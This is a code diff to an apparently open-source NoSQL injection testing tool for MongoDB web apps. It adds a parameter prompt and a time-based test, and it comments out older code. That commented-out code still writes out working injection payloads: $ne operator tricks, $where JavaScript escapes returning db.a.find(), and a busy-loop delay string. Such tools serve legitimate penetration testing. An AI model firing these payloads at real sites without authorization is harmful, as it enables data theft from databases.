@@ -243,6 +243,12 @@ def webApps():
     '''create a InjectionManager obj using conn as parameter, and then run all tests'''
     '''MUST ASK for vuln param in get, or run tests for all params (check that param exists)'''
 
+    checkParam=False
+    while not checkParam:
+        vulnParam=Logger.logRequest("Insert vulnerable parameter (leave empty for running on all): ")
+        checkParam = conn.checkVulnParam(vulnParam)
+
+
     injection = InjectionManager.InjectionManager(conn, length)
     
     tests = {
@@ -250,6 +256,7 @@ def webApps():
             2:injection.mongoPHPNotEqualAssociativeArray,
             3:injection.mongoWhereInjection,
             4:injection.mongoThisNotEqualEscape,
+            5:injection.mongoTimeBasedInjection,
             }
     for t in usedTests:
         tests[t]()
@@ -451,44 +458,44 @@ def webApps():
 
 
 
-    doTimeAttack = raw_input("Start timing based tests?")
-
-    if doTimeAttack == "y" or doTimeAttack == "Y":
-        print "Starting Javascript string escape time based injection..."
-        start = time.time()
-        strTimeInj = urllib.urlopen(timeStrUri)
-        page = strTimeInj.read()
-        end = time.time()
-        strTimeInj.close()
-        #print str(end)
-        #print str(start)
-        strTimeDelta = (int(round((end - start), 3)) - timeBase)
-        #print str(strTimeDelta)
-        if strTimeDelta > 25:
-            print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
-            strTbAttack = True
-
-        else:
-            print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
-            strTbAttack = False
-
-        print "Starting Javascript integer escape time based injection..."
-        start = time.time()
-        intTimeInj = urllib.urlopen(timeIntUri)
-        page = intTimeInj.read()
-        end = time.time()
-        intTimeInj.close()
-        #print str(end)
-        #print str(start)
-        intTimeDelta = (int(round((end - start), 3)) - timeBase)
-        #print str(strTimeDelta)
-        if intTimeDelta > 25:
-            print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
-            intTbAttack = True
-
-        else:
-            print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
-            intTbAttack = False
+#    doTimeAttack = raw_input("Start timing based tests?")
+#
+#    if doTimeAttack == "y" or doTimeAttack == "Y":
+#        print "Starting Javascript string escape time based injection..."
+#        start = time.time()
+#        strTimeInj = urllib.urlopen(timeStrUri)
+#        page = strTimeInj.read()
+#        end = time.time()
+#        strTimeInj.close()
+#        #print str(end)
+#        #print str(start)
+#        strTimeDelta = (int(round((end - start), 3)) - timeBase)
+#        #print str(strTimeDelta)
+#        if strTimeDelta > 25:
+#            print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
+#            strTbAttack = True
+#
+#        else:
+#            print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
+#            strTbAttack = False
+#
+#        print "Starting Javascript integer escape time based injection..."
+#        start = time.time()
+#        intTimeInj = urllib.urlopen(timeIntUri)
+#        page = intTimeInj.read()
+#        end = time.time()
+#        intTimeInj.close()
+#        #print str(end)
+#        #print str(start)
+#        intTimeDelta = (int(round((end - start), 3)) - timeBase)
+#        #print str(strTimeDelta)
+#        if intTimeDelta > 25:
+#            print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
+#            intTbAttack = True
+#
+#        else:
+#            print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
+#            intTbAttack = False
 
 
 
@@ -568,94 +575,94 @@ def webApps():
 
 #TODO: THIS FUNCTION NEEDS SOME HEAVY REFACTORING!!
 
-def buildUri(origUri, randValue):
-    paramName = []
-    paramValue = []
-    global neqUri
-    global whereStrUri
-    global whereIntUri
-    global whereOneStr
-    global whereOneInt
-    global timeStrUri
-    global timeIntUri
-    global strThisNeqUri
-    global intThisNeqUri
-    injOpt = ""
-
-    #Split the string between the path and parameters, and then split each parameter
-    split_uri = origUri.split("?")
-    params = split_uri[1].split("&")
-
-    for item in params:
-        index = item.find("=")
-        paramName.append(item[0:index])
-        paramValue.append(item[index + 1:len(item)])
-
-    menuItem = 1
-    print "List of parameters:"
-    for params in paramName:
-        print str(menuItem) + "-" + params
-        menuItem += 1
-
-
-
-    try:
-        injIndex = raw_input("Which parameter should we inject? ")
-        injOpt = str(paramName[int(injIndex)-1])
-        print "Injecting the " + injOpt + " parameter..."
-    except:
-        raw_input("Something went wrong.  Press enter to return to the main menu...")
-        mainMenu()
-
-    evilUri = split_uri[0] + "?"
-    neqUri = split_uri[0] + "?"
-    whereStrUri = split_uri[0] + "?"
-    whereIntUri = split_uri[0] + "?"
-    whereOneStr = split_uri[0] + "?"
-    whereOneInt = split_uri[0] + "?"
-    timeStrUri = split_uri[0] + "?"
-    timeIntUri = split_uri[0] + "?"
-    strThisNeqUri = split_uri[0] + "?"
-    intThisNeqUri = split_uri[0] + "?"
-    x = 0
-
-    for item in paramName:
-        if paramName[x] == injOpt:
-            evilUri += paramName[x] + "=" + randValue + "&"
-            neqUri += paramName[x] + "[$ne]=" + randValue + "&"
-            whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-            whereIntUri += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
-            whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-            whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
-            timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
-            timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-            strThisNeqUri += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
-            intThisNeqUri += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
-
-        else:
-            evilUri += paramName[x] + "=" + paramValue[x] + "&"
-            neqUri += paramName[x] + "=" + paramValue[x] + "&"
-            whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
-            whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
-            whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
-            whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
-            timeStrUri += paramName[x] + "=" + paramValue[x] + "&"
-            timeIntUri += paramName[x] + "=" + paramValue[x] + "&"
-            strThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
-            intThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
-        x += 1
-
-    #Clip the extra & off the end of the URL
-    evilUri = evilUri[:-1]
-    neqUri = neqUri[:-1]
-    whereStrUri = whereStrUri[:-1]
-    whereIntUri = whereIntUri[:-1]
-    whereOneStr = whereOneStr[:-1]
-    whereOneInt = whereOneInt[:-1]
-    timeStrUri = timeStrUri[:-1]
-    timeIntUri = timeIntUri[:-1]
-
-    return evilUri
+#def buildUri(origUri, randValue):
+#    paramName = []
+#    paramValue = []
+#    global neqUri
+#    global whereStrUri
+#    global whereIntUri
+#    global whereOneStr
+#    global whereOneInt
+#    global timeStrUri
+#    global timeIntUri
+#    global strThisNeqUri
+#    global intThisNeqUri
+#    injOpt = ""
+#
+#    #Split the string between the path and parameters, and then split each parameter
+#    split_uri = origUri.split("?")
+#    params = split_uri[1].split("&")
+#
+#    for item in params:
+#        index = item.find("=")
+#        paramName.append(item[0:index])
+#        paramValue.append(item[index + 1:len(item)])
+#
+#    menuItem = 1
+#    print "List of parameters:"
+#    for params in paramName:
+#        print str(menuItem) + "-" + params
+#        menuItem += 1
+#
+#
+#
+#    try:
+#        injIndex = raw_input("Which parameter should we inject? ")
+#        injOpt = str(paramName[int(injIndex)-1])
+#        print "Injecting the " + injOpt + " parameter..."
+#    except:
+#        raw_input("Something went wrong.  Press enter to return to the main menu...")
+#        mainMenu()
+#
+#    evilUri = split_uri[0] + "?"
+#    neqUri = split_uri[0] + "?"
+#    whereStrUri = split_uri[0] + "?"
+#    whereIntUri = split_uri[0] + "?"
+#    whereOneStr = split_uri[0] + "?"
+#    whereOneInt = split_uri[0] + "?"
+#    timeStrUri = split_uri[0] + "?"
+#    timeIntUri = split_uri[0] + "?"
+#    strThisNeqUri = split_uri[0] + "?"
+#    intThisNeqUri = split_uri[0] + "?"
+#    x = 0
+#
+#    for item in paramName:
+#        if paramName[x] == injOpt:
+#            evilUri += paramName[x] + "=" + randValue + "&"
+#            neqUri += paramName[x] + "[$ne]=" + randValue + "&"
+#            whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
+#            whereIntUri += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
+#            whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
+#            whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
+#            timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
+#            timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
+#            strThisNeqUri += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
+#            intThisNeqUri += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+#
+#        else:
+#            evilUri += paramName[x] + "=" + paramValue[x] + "&"
+#            neqUri += paramName[x] + "=" + paramValue[x] + "&"
+#            whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
+#            whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
+#            whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
+#            whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
+#            timeStrUri += paramName[x] + "=" + paramValue[x] + "&"
+#            timeIntUri += paramName[x] + "=" + paramValue[x] + "&"
+#            strThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
+#            intThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
+#        x += 1
+#
+#    #Clip the extra & off the end of the URL
+#    evilUri = evilUri[:-1]
+#    neqUri = neqUri[:-1]
+#    whereStrUri = whereStrUri[:-1]
+#    whereIntUri = whereIntUri[:-1]
+#    whereOneStr = whereOneStr[:-1]
+#    whereOneInt = whereOneInt[:-1]
+#    timeStrUri = timeStrUri[:-1]
+#    timeIntUri = timeIntUri[:-1]
+#
+#    return evilUri
 
 #def stealDBs():
 #    menuItem = 1
